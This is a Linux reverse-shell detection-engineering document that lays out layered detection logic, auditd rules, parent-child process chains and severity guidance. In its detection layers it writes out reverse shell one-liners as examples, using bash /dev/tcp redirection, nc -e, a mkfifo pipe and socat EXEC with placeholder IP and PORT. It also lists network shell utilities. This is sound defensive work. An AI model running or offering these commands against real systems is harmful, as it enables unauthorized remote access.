# Reverse Shell Execution Detection Logic

**File Name:** `reverse-shell-execution-logic.md`

---

# Overview

This document defines the detection engineering logic for identifying Linux reverse shell execution activity.

The simulation focuses on attacker behavior where a shell process establishes or facilitates an outbound network connection to a remote listener, enabling remote command execution over a callback channel.

The objective of this detection logic is to:

- identify suspicious shell execution behavior
- correlate shell activity with outbound network communication
- detect abnormal parent-child process relationships
- detect command interpreters spawning network-capable utilities
- identify post-exploitation remote access behavior

This logic is designed for Linux telemetry sources including:

- auditd
- Sysmon for Linux
- EDR process telemetry
- process execution logs
- network connection telemetry

---

# ATT&CK Mapping

| Category | Technique |
|---|---|
| Execution | T1059 — Command and Scripting Interpreter |
| Command Shell | T1059.004 — Unix Shell |
| Command and Control | T1071 — Application Layer Protocol |
| Tool Transfer | T1105 — Ingress Tool Transfer |

---

# Simulation Objective

The reverse shell execution simulation was designed to emulate attacker post-exploitation behavior where a compromised Linux host establishes an outbound callback connection to an attacker-controlled listener.

The simulation aims to:

- generate realistic reverse shell telemetry
- observe shell execution behavior
- capture process lineage
- monitor outbound network activity
- validate behavioral detection logic
- create ATT&CK-aligned detection engineering artifacts

---

# Adversary Behavior Summary

The reverse shell simulation generated shell execution activity that attempted outbound communication to a remote listener.

Observed behavior included:

- interactive shell spawning
- bash execution
- shell redirection
- TCP callback attempts
- suspicious parent-child process chains
- outbound network activity from shell processes

Typical attacker objective:

```text
Victim Machine
    ↓
Shell Executes
    ↓
Outbound TCP Connection
    ↓
Attacker Listener Receives Interactive Shell
```

---

# Threat Hypothesis

> If a shell interpreter such as bash or sh initiates or facilitates outbound network communication to a remote host, especially using redirection or networking utilities, the activity may indicate reverse shell execution and post-exploitation remote access.

---

# Detection Objectives

The detection must identify:

- shell interpreters making outbound network connections
- bash/sh processes spawning networking utilities
- suspicious command-line patterns
- shells launched from uncommon parent processes
- execution chains associated with reverse shells
- interactive shell behavior over TCP

---

# Detection Strategy

The reverse shell detection logic is divided into multiple behavioral layers.

The strategy avoids relying exclusively on static signatures and instead prioritizes behavioral correlation between:

- process execution
- shell invocation
- process lineage
- outbound network activity
- suspicious command syntax

---

# Detection Layer 1 — Suspicious Shell Execution

## Goal

Identify execution of shell interpreters commonly used for reverse shells.

## Monitored Processes

```text
/bin/bash
/bin/sh
/usr/bin/bash
/usr/bin/sh
```

## Suspicious Characteristics

- interactive shell execution
- unusual execution context
- shell launched from scripting engines
- shell launched from web services
- shell launched from unexpected parent processes

## Example Indicators

```bash
bash -i
sh -i
/bin/bash -i
```

## Detection Focus

Process creation telemetry should capture:

| Field | Purpose |
|---|---|
| Image | Executed binary |
| ParentImage | Parent process |
| CommandLine | Execution arguments |
| User | Execution context |
| PID | Process correlation |
| PPID | Parent-child correlation |
| Timestamp | Event sequencing |

---

# Detection Layer 2 — Shell-to-Network Correlation

## Goal

Detect shell processes associated with outbound network connections.

This is the highest-value behavioral layer in the reverse shell detection strategy.

## Behavioral Pattern

```text
bash/sh
    ↓
network-capable utility
    ↓
outbound connection
```

## Common Utilities

```text
nc
netcat
curl
wget
python
perl
php
socat
openssl
```

## Suspicious Relationships

| Parent Process | Child Process |
|---|---|
| bash | nc |
| bash | curl |
| bash | python |
| sh | socat |
| bash | openssl |

---

# Detection Layer 3 — Reverse Shell Command Patterns

## Goal

Identify command-line syntax commonly associated with reverse shells.

---

## Bash TCP Redirection

### Example

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

### Indicators

- `/dev/tcp/`
- `0>&1`
- `>&`
- interactive shell

---

## Netcat Reverse Shell

### Example

```bash
nc -e /bin/bash IP PORT
```

### Indicators

- `nc -e`
- `netcat -e`
- shell execution through netcat

---

## FIFO Reverse Shell

### Example

```bash
mkfifo /tmp/f; nc IP PORT < /tmp/f | /bin/sh > /tmp/f
```

### Indicators

- `mkfifo`
- temporary named pipes
- shell redirection

---

## Python Reverse Shell

### Example

```python
python -c 'import socket,subprocess,os'
```

### Indicators

- inline python execution
- socket module usage
- subprocess spawning

---

## Socat Reverse Shell

### Example

```bash
socat TCP:IP:PORT EXEC:/bin/bash
```

### Indicators

- `EXEC:/bin/bash`
- TCP socket execution

---

# Detection Layer 4 — Suspicious Parent-Child Relationships

## Goal

Detect unusual execution lineage associated with reverse shell activity.

---

## Suspicious Parent Processes

| Parent Process | Reason |
|---|---|
| apache2 | possible web exploitation |
| nginx | web shell activity |
| python | script-based payload |
| perl | scripting abuse |
| php-fpm | web exploitation |
| cron | persistence-triggered shell |
| systemd | malicious service execution |

---

## Example Suspicious Chains

### Web Exploitation Chain

```text
apache2
 └── bash
      └── nc
```

---

### Malicious systemd Service Chain

```text
systemd
 └── bash
      └── outbound connection
```

---

### Python Execution Chain

```text
python
 └── sh
      └── TCP callback
```

---

# Detection Layer 5 — Outbound Connection Analytics

## Goal

Identify suspicious outbound connections originating from shell activity.

## Indicators

- shell process initiates outbound TCP
- uncommon external destination
- interactive TCP session
- callback to attacker-controlled IP
- suspicious destination port
- shell-linked network socket creation

---

## Common Reverse Shell Ports

```text
4444
4445
5555
8080
9001
1337
```

Port-based detection alone is weak because attackers can use arbitrary ports.

Behavioral correlation is mandatory.

---

# Primary Behavioral Correlation

## Core Detection Logic

```text
IF
    shell process executes
AND
    shell process spawns networking utility
OR
    shell process initiates outbound connection
THEN
    raise reverse shell execution alert
```

---

# Telemetry Requirements

# Required Process Telemetry

| Field | Purpose |
|---|---|
| Image | executed binary |
| CommandLine | reverse shell syntax |
| ParentImage | process lineage |
| PID | process tracking |
| PPID | parent-child correlation |
| User | execution context |
| CurrentDirectory | execution path |
| Hostname | affected system |
| Timestamp | event timeline |

---

# Required Network Telemetry

| Field | Purpose |
|---|---|
| SourceIP | victim host |
| DestinationIP | attacker host |
| DestinationPort | callback destination |
| Protocol | TCP/UDP |
| ProcessName | originating process |
| PID | process correlation |
| ConnectionState | outbound activity |

---

# Auditd Detection Opportunities

## Relevant Syscalls

```text
execve
connect
socket
dup2
```

---

# Important Simulation Observations

The reverse shell simulation revealed that:

- auditd captured execution telemetry inconsistently depending on active rules
- bash execution visibility depended on proper execve monitoring
- outbound connection visibility required socket/connect syscall monitoring
- process correlation quality depended heavily on PID and PPID telemetry
- shell-to-network correlation is stronger than standalone shell detections

---

# Recommended Auditd Rules

## Process Execution Monitoring

```bash
-a always,exit -F arch=b64 -S execve -k exec_monitor
```

---

## Network Connection Monitoring

```bash
-a always,exit -F arch=b64 -S connect -k network_connect
```

---

## Socket Monitoring

```bash
-a always,exit -F arch=b64 -S socket -k socket_monitor
```

---

# Detection Logic Conditions

# High-Fidelity Conditions

Detection confidence significantly increases when:

- shell process AND outbound connection occur together
- shell spawns networking utility
- reverse shell syntax appears in command line
- shell originates from web-facing service
- TCP redirection syntax is observed
- suspicious scripting interpreter launches shell

---

# Medium-Fidelity Conditions

Potentially suspicious behaviors include:

- interactive shell execution
- unusual parent-child lineage
- outbound connections from scripting engines
- shell execution by service accounts
- shell launched from cron/systemd unexpectedly

---

# Low-Fidelity Conditions

Lower-confidence signals include:

- isolated shell execution
- single netcat execution
- standalone curl/wget activity
- generic scripting interpreter usage

These conditions require additional enrichment.

---

# False Positive Considerations

## Potential Legitimate Sources

Possible benign activity may include:

- administrative troubleshooting
- automation frameworks
- CI/CD operations
- monitoring utilities
- development/debugging environments
- remote maintenance tooling

---

# False Positive Reduction Strategy

## Recommended Exclusions

Exclude trusted:

- automation scripts
- management servers
- backup infrastructure
- monitoring agents
- sanctioned administration tooling
- internal testing systems

---

# Detection Severity Guidance

| Severity | Condition |
|---|---|
| Critical | confirmed shell + outbound callback |
| High | shell spawned networking utility |
| Medium | suspicious shell lineage |
| Low | isolated shell anomaly |

---

# Detection Enrichment Recommendations

Useful enrichment fields include:

- GeoIP context
- destination IP reputation
- process ancestry tree
- user privilege level
- TTY session information
- interactive vs non-interactive shell
- external network classification
- known malicious infrastructure matching

---

# Example Detection Narrative

> A shell interpreter executed on the Linux host and initiated suspicious outbound network communication consistent with reverse shell behavior. The observed process lineage and command-line syntax indicate possible unauthorized remote access and post-exploitation activity.

---

# Expected Detection Artifacts

The completed reverse shell detection engineering workflow should produce:

- detection logic documentation
- Sigma detection rule
- validation procedures
- telemetry documentation
- investigation notes
- sample process telemetry
- sample network telemetry
- sample alerts
- triggered detection fields
- evidence screenshots
- process lineage proof
- network callback evidence

---

# Validation Requirements

The reverse shell detection logic is considered validated when:

- reverse shell execution successfully generates telemetry
- shell execution is captured
- process lineage is observable
- outbound connection telemetry is correlated
- Sigma rule triggers correctly
- alert artifacts are generated
- screenshots confirm behavioral evidence

---

# Evidence Collection Requirements

Recommended evidence artifacts:

| Evidence | Purpose |
|---|---|
| reverse-shell-terminal.png | proof of shell execution |
| process-lineage-proof.png | parent-child relationships |
| outbound-connection-proof.png | network callback evidence |
| auditd-execve-proof.png | syscall telemetry |
| detection-trigger-proof.png | Sigma alert validation |
| listener-session-proof.png | remote shell confirmation |

---

# Recommended Repository Placement

```text
detections/
└── logic/
    └── reverse-shell-execution-logic.md
```

---

# Final Detection Philosophy

Reverse shell detection should prioritize behavioral correlation instead of relying only on static signatures.

Reliable detection depends on correlating:

```text
Shell Execution
    +
Process Lineage
    +
Outbound Network Activity
    +
Suspicious Command Syntax
```

Single-event detections are weak and generate false positives.

Multi-layer behavioral analytics provide significantly stronger detection fidelity for reverse shell activity on Linux systems.
